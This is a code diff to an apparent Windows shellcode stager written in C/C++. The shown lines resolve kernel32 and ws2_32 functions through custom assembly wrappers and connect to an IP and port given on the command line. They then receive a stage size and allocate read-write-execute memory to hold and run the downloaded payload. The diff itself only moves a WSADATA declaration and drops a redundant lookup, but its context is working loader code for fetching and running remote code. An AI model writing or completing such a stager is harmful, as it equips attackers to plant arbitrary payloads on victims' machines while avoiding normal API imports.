@@ -14,6 +14,8 @@ extern "C" int __fastcall asmRecv(SOCKET s, void * buf, int size, FARPROC funcAd
 extern "C" LPVOID __fastcall asmVirtualAlloc(FARPROC funcAddress, int stageSize, DWORD flAllocationType, DWORD flProtect);
 extern "C" LPVOID __fastcall asmVirtualProtect(void* addr, int stageSize, DWORD flNewProtect, FARPROC funcAddress);
 
+WSADATA WSAData;
+
 int main(int argc, const char* argv[])
 {
 	const char* ip;
@@ -30,7 +32,6 @@ int main(int argc, const char* argv[])
 		port = strtol(argv[2], NULL, 10);
 	}
 
-	WSADATA WSAData;
 	SOCKET socket = 0;
 	int stageSize = 0;
 	int bytesReceived = 0;
@@ -39,7 +40,6 @@ int main(int argc, const char* argv[])
 	printf("[+] Loaded kernel32.dll: 0x%x\n", kernel32);
 	FARPROC GetProcAddress = GetAddressOfGetProcAddress(kernel32);
 	printf("[+] Found GetProcAddress function: 0x%x\n", GetProcAddress);
-	
 	FARPROC LoadLibraryA = asmGetProcAddress(kernel32, "LoadLibraryA", GetProcAddress);
 	printf("[+] Found LoadLibraryA: 0x%x\n", LoadLibraryA);
 	HMODULE ws2_32 = asmLoadLibrary("ws2_32", LoadLibraryA);
@@ -58,9 +58,6 @@ int main(int argc, const char* argv[])
 	printf("[+] Found Recv function: 0x%x\n", recv);
 	asmRecv(socket, &stageSize, 4, recv);
 	printf("[+] Obtained stage size: %d\n", stageSize);
-
-	kernel32 = GetKernel32ModuleHandle();
-
 	FARPROC virtualAlloc = asmGetProcAddress(kernel32, "VirtualAlloc", GetProcAddress);
 	printf("[+] Found virtualAlloc function: 0x%x\n", virtualAlloc);
 	LPVOID addr = asmVirtualAlloc(virtualAlloc, stageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
